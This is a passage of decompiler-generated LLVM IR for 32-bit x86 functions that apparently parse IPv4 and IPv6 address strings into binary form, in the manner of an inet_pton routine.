  br i1 %v1_8051483, label %dec_label_pc_80514a3.backedge, label %dec_label_pc_8051485

dec_label_pc_8051485:                             ; preds = %dec_label_pc_805147f
  %v0_8051485 = load i32, i32* @edi, align 4
  %v1_8051485 = add i32 %v0_8051485, 1
  store i32 %v1_8051485, i32* @edi, align 4
  %v1_8051486 = add i32 %v0_8051485, -3
  %v6_8051486 = sub i32 2, %v0_8051485
  %v7_8051486 = and i32 %v6_8051486, %v1_8051485
  %v8_8051486 = icmp slt i32 %v7_8051486, 0
  %v9_8051486 = icmp eq i32 %v1_8051486, 0
  store i1 %v9_8051486, i1* %zf.global-to-local, align 1
  %v10_8051486 = icmp slt i32 %v1_8051486, 0
  %v3_8051489 = icmp eq i1 %v10_8051486, %v8_8051486
  %v4_8051489 = icmp eq i1 %v9_8051486, false
  %v5_8051489 = and i1 %v4_8051489, %v3_8051489
  br i1 %v5_8051489, label %dec_label_pc_80514c8, label %dec_label_pc_805148b

dec_label_pc_805148b:                             ; preds = %dec_label_pc_8051485
  %v0_805148b = load i32, i32* @edx, align 4
  %v1_805148b = and i32 %v0_805148b, -256
  %v2_805148b = or i32 %v1_805148b, 1
  store i32 %v2_805148b, i32* @edx, align 4
  br label %dec_label_pc_80514a3.backedge

dec_label_pc_805148f:                             ; preds = %dec_label_pc_8051466
  %v9_805148f = icmp eq i8 %v2_80514a322, 46
  store i1 %v9_805148f, i1* %zf.global-to-local, align 1
  %v1_8051492 = icmp eq i1 %v9_805148f, false
  br i1 %v1_8051492, label %dec_label_pc_80514c8, label %dec_label_pc_8051494

dec_label_pc_8051494:                             ; preds = %dec_label_pc_805148f
  %v0_8051494 = load i32, i32* @edx, align 4
  %v1_8051494 = icmp eq i32 %v0_8051494, 0
  store i1 %v1_8051494, i1* %zf.global-to-local, align 1
  br i1 %v1_8051494, label %dec_label_pc_80514c8, label %dec_label_pc_8051498

dec_label_pc_8051498:                             ; preds = %dec_label_pc_8051494
  %v0_8051498 = load i32, i32* @edi, align 4
  %v9_8051498 = icmp eq i32 %v0_8051498, 4
  store i1 %v9_8051498, i1* %zf.global-to-local, align 1
  br i1 %v9_8051498, label %dec_label_pc_80514c8, label %dec_label_pc_805149d

dec_label_pc_805149d:                             ; preds = %dec_label_pc_8051498
  %v0_805149d = load i32, i32* @esi, align 4
  %v1_805149d = add i32 %v0_805149d, 1
  store i32 %v1_805149d, i32* @esi, align 4
  store i1 true, i1* %zf.global-to-local, align 1
  store i32 0, i32* @edx, align 4
  %v1_80514a0 = inttoptr i32 %v1_805149d to i8*
  store i8 0, i8* %v1_80514a0, align 1
  br label %dec_label_pc_80514a3.backedge

dec_label_pc_80514a3.backedge:                    ; preds = %dec_label_pc_805149d, %dec_label_pc_805148b, %dec_label_pc_805147f
  %v0_80514a3.pre = load i32, i32* %ebx.global-to-local, align 4
  %v1_80514a3 = inttoptr i32 %v0_80514a3.pre to i8*
  %v2_80514a3 = load i8, i8* %v1_80514a3, align 1
  %v3_80514a3 = sext i8 %v2_80514a3 to i32
  store i32 %v3_80514a3, i32* @ecx, align 4
  %v1_80514a6 = add i32 %v0_80514a3.pre, 1
  store i32 %v1_80514a6, i32* %ebx.global-to-local, align 4
  %v1_80514a7 = icmp eq i8 %v2_80514a3, 0
  store i1 %v1_80514a7, i1* %zf.global-to-local, align 1
  %v1_80514a9 = icmp eq i1 %v1_80514a7, false
  br i1 %v1_80514a9, label %dec_label_pc_8051466, label %dec_label_pc_80514a3.dec_label_pc_80514ab_crit_edge

dec_label_pc_80514a3.dec_label_pc_80514ab_crit_edge: ; preds = %dec_label_pc_80514a3.backedge
  %v0_80514ab.pre = load i32, i32* @edi, align 4
  br label %dec_label_pc_80514ab

dec_label_pc_80514ab:                             ; preds = %dec_label_pc_80514a3.dec_label_pc_80514ab_crit_edge, %dec_label_pc_805144c
  %v0_80514ab = phi i32 [ %v0_80514ab.pre, %dec_label_pc_80514a3.dec_label_pc_80514ab_crit_edge ], [ 0, %dec_label_pc_805144c ]
  %v10_80514ab = icmp eq i32 %v0_80514ab, 3
  store i1 %v10_80514ab, i1* %zf.global-to-local, align 1
  %v7_80514ae = icmp sgt i32 %v0_80514ab, 3
  br i1 %v7_80514ae, label %dec_label_pc_80514b0, label %dec_label_pc_80514c8

dec_label_pc_80514b0:                             ; preds = %dec_label_pc_80514ab
  %v0_80514b0 = load i32, i32* @eax, align 4
  %v3_80514b9 = bitcast i32* %stack_var_-20 to i16*
  %v4_80514b9 = call i32 @function_804d1a8(i16* %v3_80514b9, i32 4, i32 %v0_80514b0)
  %v0_80514c3 = load i32, i32* @esp, align 4
  %v6_80514c3 = icmp eq i32 %v0_80514c3, -16
  store i1 %v6_80514c3, i1* %zf.global-to-local, align 1
  br label %dec_label_pc_80514ca

dec_label_pc_80514c8:                             ; preds = %dec_label_pc_8051498, %dec_label_pc_8051494, %dec_label_pc_805148f, %dec_label_pc_8051485, %dec_label_pc_805146e, %dec_label_pc_80514ab
  store i1 true, i1* %zf.global-to-local, align 1
  %v0_80514ca.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_80514ca

dec_label_pc_80514ca:                             ; preds = %dec_label_pc_80514b0, %dec_label_pc_80514c8
  %v0_80514ca = phi i32 [ %v15_8051458, %dec_label_pc_80514b0 ], [ %v0_80514ca.pre, %dec_label_pc_80514c8 ]
  %v0_80514d1 = phi i32 [ 1, %dec_label_pc_80514b0 ], [ 0, %dec_label_pc_80514c8 ]
  %v9_80514ca = icmp eq i32 %v0_80514ca, -28
  store i1 %v9_80514ca, i1* %zf.global-to-local, align 1
  %v2_80514cd = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_80514cd, i32* @ebx, align 4
  store i32 %v0_8051452, i32* @esi, align 4
  ret i32 %v0_80514d1

; uselistorder directives
  uselistorder i32 %v0_80514ab, { 1, 0 }
  uselistorder i32 %v3_80514a3, { 1, 0 }
  uselistorder i8 %v2_80514a3, { 1, 2, 0 }
  uselistorder i1 %v9_8051498, { 1, 0 }
  uselistorder i32 %v1_8051486, { 1, 0 }
  uselistorder i32 %v3_8051474, { 1, 2, 0, 3 }
  uselistorder i8 %v2_80514a322, { 1, 0 }
  uselistorder i1* %zf.global-to-local, { 0, 1, 2, 3, 13, 4, 5, 6, 7, 8, 9, 10, 11, 12, 15, 14 }
  uselistorder i32* %ebx.global-to-local, { 0, 2, 3, 1 }
  uselistorder i32 255, { 5, 2, 1, 0, 4, 6, 7, 11, 3, 8, 9, 10 }
  uselistorder label %dec_label_pc_80514ca, { 1, 0 }
  uselistorder label %dec_label_pc_80514c8, { 5, 0, 1, 2, 3, 4 }
  uselistorder label %dec_label_pc_8051466, { 1, 0 }
}

define i32 @function_80514d2(i32 %arg1, i8* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_80514d2:
  %eax.global-to-local = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %v0_80514d2 = load i32, i32* @ebp, align 4
  %v0_80514d3 = load i32, i32* @edi, align 4
  %v0_80514d4 = load i32, i32* @esi, align 4
  %v0_80514d5 = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* %eax.global-to-local, align 4
  %v4_80514dd = ptrtoint i8* %arg2 to i32
  store i32 %v4_80514dd, i32* @edi, align 4
  %v9_80514e1 = icmp eq i32 %arg1, 2
  br i1 %v9_80514e1, label %dec_label_pc_80514f1, label %dec_label_pc_80514e6

dec_label_pc_80514e6:                             ; preds = %dec_label_pc_80514d2
  %v9_80514e6 = icmp eq i32 %arg1, 10
  %v1_80514e9 = icmp eq i1 %v9_80514e6, false
  br i1 %v1_80514e9, label %dec_label_pc_8051682, label %dec_label_pc_8051501

dec_label_pc_80514f1:                             ; preds = %dec_label_pc_80514d2
  store i32 %arg3, i32* @edx, align 4
  store i32 %v4_80514dd, i32* @eax, align 4
  %v3_80514f7 = call i32 @function_805144c(i32 %v0_80514d5, i32 %v0_80514d4, i32 %v0_80514d3)
  store i32 %v3_80514f7, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8051694

dec_label_pc_8051501:                             ; preds = %dec_label_pc_80514e6
  %v2_8051506 = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_8051506, i32* %eax.global-to-local, align 4
  %tmp60 = bitcast i32* %stack_var_-32 to i8*
  %v5_805150b = call i32 @function_804d1d0(i8* %tmp60, i32 0, i32 16)
  store i32 %v5_805150b, i32* @ebx, align 4
  %v2_8051512 = add i32 %v5_805150b, 16
  store i32 %v2_8051512, i32* %eax.global-to-local, align 4
  %v0_805151c = load i32, i32* @edi, align 4
  %v1_805151c = inttoptr i32 %v0_805151c to i8*
  %v2_805151c = load i8, i8* %v1_805151c, align 1
  %v11_805151c = icmp eq i8 %v2_805151c, 58
  %v1_805151f = icmp eq i1 %v11_805151c, false
  br i1 %v1_805151f, label %dec_label_pc_80515b2, label %dec_label_pc_8051521

dec_label_pc_8051521:                             ; preds = %dec_label_pc_8051501
  %v1_8051521 = add i32 %v0_805151c, 1
  store i32 %v1_8051521, i32* @edi, align 4
  %v1_8051522 = inttoptr i32 %v1_8051521 to i8*
  %v2_8051522 = load i8, i8* %v1_8051522, align 1
  %v11_8051522 = icmp eq i8 %v2_8051522, 58
  %v1_8051525 = icmp eq i1 %v11_8051522, false
  br i1 %v1_8051525, label %dec_label_pc_8051692, label %dec_label_pc_80515b2

dec_label_pc_8051539:                             ; preds = %dec_label_pc_80515f2
  %v0_8051539 = load i32, i32* @ecx, align 4
  %v0_805153a = load i32, i32* @edi, align 4
  %v1_805153a = add i32 %v0_805153a, 1
  store i32 %v1_805153a, i32* @edi, align 4
  %v7_8051542 = call i32 @function_8052000(i8* getelementptr inbounds ([17 x i8], [17 x i8]* @global_var_80549d4.208, i32 0, i32 0), i32 %v2_80515f9, i32 %v0_8051539, i32 %v0_8051539)
  store i32 %v7_8051542, i32* %eax.global-to-local, align 4
  %v1_805154a = icmp eq i32 %v7_8051542, 0
  br i1 %v1_805154a, label %dec_label_pc_8051569, label %dec_label_pc_805154e

dec_label_pc_805154e:                             ; preds = %dec_label_pc_8051539
  %v0_805154e = load i32, i32* @ebp, align 4
  %v2_805154e = mul i32 %v0_805154e, 16
  %v1_8051551 = add i32 %v7_8051542, -134564308
  store i32 %v1_8051551, i32* %eax.global-to-local, align 4
  %v2_8051556 = or i32 %v2_805154e, %v1_8051551
  store i32 %v2_8051556, i32* @ebp, align 4
  %tmp = icmp ult i32 %v2_8051556, 65536
  br i1 %tmp, label %dec_label_pc_805154e.dec_label_pc_80515f2.outer_crit_edge, label %dec_label_pc_8051692

dec_label_pc_805154e.dec_label_pc_80515f2.outer_crit_edge: ; preds = %dec_label_pc_805154e
  %v0_80515f2.pre.pre = load i32, i32* @edi, align 4
  br label %dec_label_pc_80515f2.outer

dec_label_pc_80515f2.outer:                       ; preds = %dec_label_pc_805154e.dec_label_pc_80515f2.outer_crit_edge, %dec_label_pc_80515b2
  %v0_80515f2.pre = phi i32 [ %v0_80515f2.pre.pre, %dec_label_pc_805154e.dec_label_pc_80515f2.outer_crit_edge ], [ %stack_var_-36.0.in, %dec_label_pc_80515b2 ]
  %stack_var_-44.1.ph = phi i8* [ %stack_var_-44.1, %dec_label_pc_805154e.dec_label_pc_80515f2.outer_crit_edge ], [ %stack_var_-44.0, %dec_label_pc_80515b2 ]
  %stack_var_-36.1.ph = phi i8* [ %stack_var_-36.1, %dec_label_pc_805154e.dec_label_pc_80515f2.outer_crit_edge ], [ %stack_var_-36.0, %dec_label_pc_80515b2 ]
  %stack_var_-48.0.ph = phi i32 [ 1, %dec_label_pc_805154e.dec_label_pc_80515f2.outer_crit_edge ], [ 0, %dec_label_pc_80515b2 ]
  %v4_805156e = icmp eq i32 %stack_var_-48.0.ph, 0
  %v1_8051573 = icmp eq i1 %v4_805156e, false
  br label %dec_label_pc_80515f2

dec_label_pc_8051569:                             ; preds = %dec_label_pc_8051539
  %v0_8051569 = load i32, i32* @esi, align 4
  %v9_8051569 = icmp eq i32 %v0_8051569, 58
  %v1_805156c = icmp eq i1 %v9_8051569, false
  br i1 %v1_805156c, label %dec_label_pc_80515be, label %dec_label_pc_805156e

dec_label_pc_805156e:                             ; preds = %dec_label_pc_8051569
  br i1 %v1_8051573, label %dec_label_pc_805158a, label %dec_label_pc_8051575

dec_label_pc_8051575:                             ; preds = %dec_label_pc_805156e
  %v5_8051575 = icmp eq i8* %stack_var_-44.1, null
  %v1_805157a = icmp eq i1 %v5_8051575, false
  br i1 %v1_805157a, label %dec_label_pc_8051692, label %dec_label_pc_8051580

dec_label_pc_8051580:                             ; preds = %dec_label_pc_8051575
  %v0_8051580 = load i32, i32* @ebx, align 4
  %v5_8051580 = inttoptr i32 %v0_8051580 to i8*
  %v0_8051584 = load i32, i32* @edi, align 4
  %v5_8051584 = inttoptr i32 %v0_8051584 to i8*
  br label %dec_label_pc_80515f2

dec_label_pc_805158a:                             ; preds = %dec_label_pc_805156e
  %v0_805158a = load i32, i32* @edi, align 4
  %v1_805158a = inttoptr i32 %v0_805158a to i8*
  %v2_805158a = load i8, i8* %v1_805158a, align 1
  %v3_805158a = icmp eq i8 %v2_805158a, 0
  br i1 %v3_805158a, label %dec_label_pc_8051692, label %dec_label_pc_8051593

dec_label_pc_8051593:                             ; preds = %dec_label_pc_805158a
  %v0_8051593 = load i32, i32* @ebx, align 4
  %v1_8051593 = add i32 %v0_8051593, 2
  store i32 %v1_8051593, i32* @edx, align 4
  %v6_805159a = icmp ugt i32 %v1_8051593, %v2_8051512
  br i1 %v6_805159a, label %dec_label_pc_8051692, label %dec_label_pc_80515a0

dec_label_pc_80515a0:                             ; preds = %dec_label_pc_8051593
  %v0_80515a0 = load i32, i32* @ebp, align 4
  %v2_80515a2 = udiv i32 %v0_80515a0, 256
  %v4_80515a2 = trunc i32 %v2_80515a2 to i8
  %v3_80515a5 = inttoptr i32 %v0_8051593 to i8*
  store i8 %v4_80515a2, i8* %v3_80515a5, align 1
  %v0_80515a7 = load i32, i32* @ebp, align 4
  store i32 %v0_80515a7, i32* %eax.global-to-local, align 4
  %v1_80515a9 = trunc i32 %v0_80515a7 to i8
  %v2_80515a9 = load i32, i32* @ebx, align 4
  %v3_80515a9 = add i32 %v2_80515a9, 1
  %v4_80515a9 = inttoptr i32 %v3_80515a9 to i8*
  store i8 %v1_80515a9, i8* %v4_80515a9, align 1
  %v0_80515ac = load i32, i32* @edx, align 4
  store i32 %v0_80515ac, i32* @ebx, align 4
  %stack_var_-36.0.in.pre = load i32, i32* @edi, align 4
  br label %dec_label_pc_80515b2

dec_label_pc_80515b2:                             ; preds = %dec_label_pc_8051501, %dec_label_pc_8051521, %dec_label_pc_80515a0
  %stack_var_-36.0.in = phi i32 [ %stack_var_-36.0.in.pre, %dec_label_pc_80515a0 ], [ %v1_8051521, %dec_label_pc_8051521 ], [ %v0_805151c, %dec_label_pc_8051501 ]
  %stack_var_-44.0 = phi i8* [ %stack_var_-44.1, %dec_label_pc_80515a0 ], [ null, %dec_label_pc_8051521 ], [ null, %dec_label_pc_8051501 ]
  %stack_var_-36.0 = inttoptr i32 %stack_var_-36.0.in to i8*
  store i32 0, i32* @ebp, align 4
  br label %dec_label_pc_80515f2.outer

dec_label_pc_80515be:                             ; preds = %dec_label_pc_8051569
  %v9_80515be = icmp eq i32 %v0_8051569, 46
  %v1_80515c1 = icmp eq i1 %v9_80515be, false
  br i1 %v1_80515c1, label %dec_label_pc_8051692, label %dec_label_pc_80515c7

dec_label_pc_80515c7:                             ; preds = %dec_label_pc_80515be
  %v0_80515c7 = load i32, i32* @ebx, align 4
  %v1_80515c7 = add i32 %v0_80515c7, 4
  store i32 %v1_80515c7, i32* @esi, align 4
  %v6_80515ce = icmp ugt i32 %v1_80515c7, %v2_8051512
  br i1 %v6_80515ce, label %dec_label_pc_8051692, label %dec_label_pc_80515d4

dec_label_pc_80515d4:                             ; preds = %dec_label_pc_80515c7
  %v4_80515d4 = ptrtoint i8* %stack_var_-36.1 to i32
  store i32 %v4_80515d4, i32* @eax, align 4
  store i32 %v0_80515c7, i32* @edx, align 4
  store i32 %v1_80515c7, i32* @ebx, align 4
  %v2_80515dc = ptrtoint i8* %stack_var_-44.1 to i32
  %v5_80515dc = call i32 @function_805144c(i32 %stack_var_-48.0.ph, i32 %v2_80515dc, i32 %v2_8051512)
  store i32 %v5_80515dc, i32* %eax.global-to-local, align 4
  %tmp61 = icmp slt i32 %v5_80515dc, 1
  %tmp62 = icmp eq i1 %tmp61, false
  br i1 %tmp62, label %dec_label_pc_8051629, label %dec_label_pc_8051692

dec_label_pc_80515f2:                             ; preds = %dec_label_pc_80515f2.outer, %dec_label_pc_8051580
  %v0_80515f2 = phi i32 [ %v0_8051584, %dec_label_pc_8051580 ], [ %v0_80515f2.pre, %dec_label_pc_80515f2.outer ]
  %stack_var_-44.1 = phi i8* [ %v5_8051580, %dec_label_pc_8051580 ], [ %stack_var_-44.1.ph, %dec_label_pc_80515f2.outer ]
  %stack_var_-36.1 = phi i8* [ %v5_8051584, %dec_label_pc_8051580 ], [ %stack_var_-36.1.ph, %dec_label_pc_80515f2.outer ]
  %v1_80515f2 = inttoptr i32 %v0_80515f2 to i8*
  %v2_80515f2 = load i8, i8* %v1_80515f2, align 1
  %v3_80515f2 = sext i8 %v2_80515f2 to i32
  store i32 %v3_80515f2, i32* %eax.global-to-local, align 4
  %v2_80515f9 = call i32 @function_8051fe0(i32 %v3_80515f2)
  store i32 %v2_80515f9, i32* %eax.global-to-local, align 4
  %v1_8051601 = icmp eq i32 %v2_80515f9, 0
  store i32 %v2_80515f9, i32* @esi, align 4
  %v1_8051605 = icmp eq i1 %v1_8051601, false
  br i1 %v1_8051605, label %dec_label_pc_8051539, label %dec_label_pc_805160b

dec_label_pc_805160b:                             ; preds = %dec_label_pc_80515f2
  br i1 %v4_805156e, label %dec_label_pc_8051629, label %dec_label_pc_8051612

dec_label_pc_8051612:                             ; preds = %dec_label_pc_805160b
  %v0_8051612 = load i32, i32* @ebx, align 4
  %v1_8051612 = add i32 %v0_8051612, 2
  store i32 %v1_8051612, i32* @edx, align 4
  %v6_8051619 = icmp ugt i32 %v1_8051612, %v2_8051512
  br i1 %v6_8051619, label %dec_label_pc_8051692, label %dec_label_pc_805161b

dec_label_pc_805161b:                             ; preds = %dec_label_pc_8051612
  %v0_805161b = load i32, i32* @ebp, align 4
  %v2_805161d = udiv i32 %v0_805161b, 256
  %v4_805161d = trunc i32 %v2_805161d to i8
  %v3_8051620 = inttoptr i32 %v0_8051612 to i8*
  store i8 %v4_805161d, i8* %v3_8051620, align 1
  %v0_8051622 = load i32, i32* @ebp, align 4
  store i32 %v0_8051622, i32* %eax.global-to-local, align 4
  %v1_8051624 = trunc i32 %v0_8051622 to i8
  %v2_8051624 = load i32, i32* @ebx, align 4
  %v3_8051624 = add i32 %v2_8051624, 1
  %v4_8051624 = inttoptr i32 %v3_8051624 to i8*
  store i8 %v1_8051624, i8* %v4_8051624, align 1
  %v0_8051627 = load i32, i32* @edx, align 4
  store i32 %v0_8051627, i32* @ebx, align 4
  br label %dec_label_pc_8051629

dec_label_pc_8051629:                             ; preds = %dec_label_pc_805160b, %dec_label_pc_80515d4, %dec_label_pc_805161b
  %v4_8051629 = ptrtoint i8* %stack_var_-44.1 to i32
  %v5_8051629 = icmp eq i8* %stack_var_-44.1, null
  %v0_8051661.pre = load i32, i32* @ebx, align 4
  br i1 %v5_8051629, label %dec_label_pc_8051661, label %dec_label_pc_8051630

dec_label_pc_8051630:                             ; preds = %dec_label_pc_8051629
  store i32 1, i32* @esi, align 4
  %v6_8051637 = sub i32 %v0_8051661.pre, %v4_8051629
  store i32 %v6_8051637, i32* @edi, align 4
  %v16_805163b = icmp eq i32 %v0_8051661.pre, %v2_8051512
  %v1_805163f = icmp eq i1 %v16_805163b, false
  br i1 %v1_805163f, label %dec_label_pc_8051659.preheader, label %dec_label_pc_8051692

dec_label_pc_8051659.preheader:                   ; preds = %dec_label_pc_8051630
  %v3_805165988 = inttoptr i32 %v6_8051637 to i8*
  %v9_805165b93 = icmp slt i8* %v3_805165988, inttoptr (i32 1 to i8*)
  br i1 %v9_805165b93, label %dec_label_pc_805165d, label %dec_label_pc_8051643

dec_label_pc_8051643:                             ; preds = %dec_label_pc_8051659.preheader, %dec_label_pc_8051643
  %v0_805165195 = phi i32 [ %v0_8051659.pre, %dec_label_pc_8051643 ], [ 1, %dec_label_pc_8051659.preheader ]
  %v0_805164394 = phi i32 [ %v1_8051659.pre, %dec_label_pc_8051643 ], [ %v6_8051637, %dec_label_pc_8051659.preheader ]
  %v2_8051649 = sub i32 %v0_805164394, %v0_805165195
  %v6_805164b = add i32 %v2_8051649, %v4_8051629
  store i32 %v6_805164b, i32* %eax.global-to-local, align 4
  %v2_805164f = sub i32 %v2_8051512, %v0_805165195
  store i32 %v2_805164f, i32* @ecx, align 4
  %v1_8051651 = add i32 %v0_805165195, 1
  store i32 %v1_8051651, i32* @esi, align 4
  %v1_8051652 = inttoptr i32 %v6_805164b to i8*
  %v2_8051652 = load i8, i8* %v1_8051652, align 1
  %v3_8051652 = zext i8 %v2_8051652 to i32
  %v4_8051652 = load i32, i32* @edx, align 4
  %v5_8051652 = and i32 %v4_8051652, -256
  %v6_8051652 = or i32 %v5_8051652, %v3_8051652
  store i32 %v6_8051652, i32* @edx, align 4
  %v3_8051654 = inttoptr i32 %v2_805164f to i8*
  store i8 %v2_8051652, i8* %v3_8051654, align 1
  %v0_8051656 = load i32, i32* %eax.global-to-local, align 4
  %v1_8051656 = inttoptr i32 %v0_8051656 to i8*
  store i8 0, i8* %v1_8051656, align 1
  %v0_8051659.pre = load i32, i32* @esi, align 4
  %v1_8051659.pre = load i32, i32* @edi, align 4
  %v2_8051659 = inttoptr i32 %v0_8051659.pre to i8*
  %v3_8051659 = inttoptr i32 %v1_8051659.pre to i8*
  %v9_805165b = icmp sgt i8* %v2_8051659, %v3_8051659
  br i1 %v9_805165b, label %dec_label_pc_805165d, label %dec_label_pc_8051643

dec_label_pc_805165d:                             ; preds = %dec_label_pc_8051643, %dec_label_pc_8051659.preheader
  br label %dec_label_pc_8051661

dec_label_pc_8051661:                             ; preds = %dec_label_pc_8051629, %dec_label_pc_805165d
  %v0_8051661 = phi i32 [ %v2_8051512, %dec_label_pc_805165d ], [ %v0_8051661.pre, %dec_label_pc_8051629 ]
  %v16_8051661 = icmp eq i32 %v0_8051661, %v2_8051512
  %v1_8051665 = icmp eq i1 %v16_8051661, false
  br i1 %v1_8051665, label %dec_label_pc_8051692, label %dec_label_pc_8051667

dec_label_pc_8051667:                             ; preds = %dec_label_pc_8051661
  store i32 %v2_8051506, i32* %eax.global-to-local, align 4
  %tmp63 = inttoptr i32 %arg3 to i16*
  %v5_8051673 = call i32 @function_804d1a8(i16* %tmp63, i32 %v2_8051506, i32 16)
  store i32 1, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8051694

dec_label_pc_8051682:                             ; preds = %dec_label_pc_80514e6
  %v1_8051682 = call i32 @function_804b7f4(i32 %v0_80514d5)
  %v1_8051687 = inttoptr i32 %v1_8051682 to i32*
  store i32 97, i32* %v1_8051687, align 4
  store i32 -1, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8051694

dec_label_pc_8051692:                             ; preds = %dec_label_pc_8051593, %dec_label_pc_805158a, %dec_label_pc_805154e, %dec_label_pc_8051575, %dec_label_pc_8051630, %dec_label_pc_80515d4, %dec_label_pc_8051661, %dec_label_pc_8051612, %dec_label_pc_80515c7, %dec_label_pc_80515be, %dec_label_pc_8051521
  store i32 0, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8051694

dec_label_pc_8051694:                             ; preds = %dec_label_pc_8051682, %dec_label_pc_8051667, %dec_label_pc_80514f1, %dec_label_pc_8051692
  %v0_805169b = phi i32 [ -1, %dec_label_pc_8051682 ], [ 1, %dec_label_pc_8051667 ], [ %v3_80514f7, %dec_label_pc_80514f1 ], [ 0, %dec_label_pc_8051692 ]
  store i32 %v0_80514d5, i32* @ebx, align 4
  store i32 %v0_80514d4, i32* @esi, align 4
  store i32 %v0_80514d3, i32* @edi, align 4
  store i32 %v0_80514d2, i32* @ebp, align 4
  ret i32 %v0_805169b

; uselistorder directives
  uselistorder i32 %v1_8051659.pre, { 1, 0 }
  uselistorder i32 %v0_8051659.pre, { 1, 0 }
  uselistorder i32 %v0_805165195, { 2, 1, 0 }
  uselistorder i32 %v0_8051661.pre, { 1, 0, 2 }
  uselistorder i32 %v2_80515f9, { 1, 2, 3, 0 }
  uselistorder i8* %stack_var_-36.1, { 1, 0 }
  uselistorder i8* %stack_var_-44.1, { 1, 0, 4, 5, 3, 2 }
  uselistorder i32 %stack_var_-36.0.in, { 1, 0 }
  uselistorder i32 %v2_8051512, { 0, 2, 3, 1, 7, 4, 5, 6, 8 }
  uselistorder i32 %v0_80514d5, { 0, 2, 1 }
  uselistorder i32* %eax.global-to-local, { 0, 1, 3, 2, 4, 5, 6, 11, 12, 7, 8, 9, 10, 13, 14, 15, 16 }
  uselistorder i32 (i32, i32, i32)* @function_805144c, { 1, 0 }
  uselistorder i32 %arg3, { 1, 0 }
  uselistorder label %dec_label_pc_8051694, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_8051692, { 6, 4, 7, 5, 8, 9, 0, 1, 3, 2, 10 }
  uselistorder label %dec_label_pc_8051661, { 1, 0 }
  uselistorder label %dec_label_pc_8051643, { 1, 0 }
  uselistorder label %dec_label_pc_8051629, { 2, 0, 1 }
  uselistorder label %dec_label_pc_80515f2, { 1, 0 }
  uselistorder label %dec_label_pc_80515b2, { 2, 1, 0 }
  uselistorder label %dec_label_pc_80515f2.outer, { 1, 0 }
}

define i32 @function_805169c(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_805169c:
  %eax.global-to-local = alloca i32, align 4
  %ebp.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %zf.global-to-local = alloca i1, align 1
  %stack_var_-92 = alloca i32, align 4
  %stack_var_-33 = alloca i32, align 4
  %stack_var_-31 = alloca i32, align 4
  %stack_var_-76 = alloca i32, align 4
  %v0_805169d = load i32, i32* @edi, align 4
  %v0_805169e = load i32, i32* @esi, align 4
  store i32 0, i32* @esi, align 4
  %v15_80516a2 = ptrtoint i32* %stack_var_-76 to i32
  %v0_80516a5 = load i32, i32* @eax, align 4
  %v3_80516a9 = and i32 %v0_80516a5, -65536
  %v2_80516af = ptrtoint i32* %stack_var_-31 to i32
  store i1 false, i1* @df, align 1
  %v0_80516b4 = load i32, i32* @edx, align 4
  %v0_80516b8 = load i32, i32* @ecx, align 4
  store i32 %v3_80516a9, i32* %stack_var_-33, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  store i32 0, i32* %stack_var_-31, align 4
  %v6_80516c3 = add i32 %v2_80516af, 4
  store i32 %v6_80516c3, i32* %edi.global-to-local, align 4
  %v2_80516c4 = inttoptr i32 %v6_80516c3 to i32*
  store i32 0, i32* %v2_80516c4, align 4
  %v3_80516c4 = load i32, i32* %edi.global-to-local, align 4
  %v6_80516c4 = add i32 %v3_80516c4, 4
  store i32 %v6_80516c4, i32* %edi.global-to-local, align 4
  %v0_80516c5 = load i32, i32* %eax.global-to-local, align 4
  %v2_80516c5 = inttoptr i32 %v6_80516c4 to i32*
  store i32 %v0_80516c5, i32* %v2_80516c5, align 4
  %v3_80516c5 = load i32, i32* %edi.global-to-local, align 4
  %v6_80516c5 = add i32 %v3_80516c5, 4
  store i32 %v6_80516c5, i32* %edi.global-to-local, align 4
  %v0_80516c6 = load i32, i32* %eax.global-to-local, align 4
  %v1_80516c6 = trunc i32 %v0_80516c6 to i16
  %v3_80516c6 = inttoptr i32 %v6_80516c5 to i16*
  store i16 %v1_80516c6, i16* %v3_80516c6, align 2
  %v4_80516c6 = load i32, i32* %edi.global-to-local, align 4
  %v7_80516c6 = add i32 %v4_80516c6, 2
  %v0_80516c8 = load i32, i32* %eax.global-to-local, align 4
  %v1_80516c8 = trunc i32 %v0_80516c8 to i8
  %v3_80516c8 = inttoptr i32 %v7_80516c6 to i8*
  store i8 %v1_80516c8, i8* %v3_80516c8, align 1
  store i32 0, i32* %edi.global-to-local, align 4
  %v0_805176324 = load i32, i32* @esi, align 4
  %v10_805176327 = icmp eq i32 %v0_805176324, 3
  store i1 %v10_805176327, i1* %zf.global-to-local, align 1
  %v7_805176629 = icmp sgt i32 %v0_805176324, 3
  br i1 %v7_805176629, label %dec_label_pc_805176c, label %dec_label_pc_80516d0

dec_label_pc_80516d0:                             ; preds = %dec_label_pc_8051743, %dec_label_pc_805169c
  %v3_80516e6 = phi i32 [ 0, %dec_label_pc_805169c ], [ %v1_805176c.pre, %dec_label_pc_8051743 ]
  %v0_805176330 = phi i32 [ %v0_805176324, %dec_label_pc_805169c ], [ %v0_8051763, %dec_label_pc_8051743 ]
  %v2_80516d6 = add i32 %v0_805176330, %v0_80516a5
  %v12_80516d6 = icmp eq i32 %v2_80516d6, 0
  store i1 %v12_80516d6, i1* %zf.global-to-local, align 1
  store i32 %v2_80516d6, i32* %ebp.global-to-local, align 4
  %v1_80516d8 = inttoptr i32 %v2_80516d6 to i8*
  %v2_80516d8 = load i8, i8* %v1_80516d8, align 1
  %v3_80516d8 = zext i8 %v2_80516d8 to i32
  %v4_80516d8 = load i32, i32* @edx, align 4
  %v5_80516d8 = and i32 %v4_80516d8, -65536
  %v6_80516d8 = or i32 %v5_80516d8, %v3_80516d8
  store i32 %v6_80516d8, i32* %edx.global-to-local, align 4
  %div5 = udiv i8 %v2_80516d8, 100
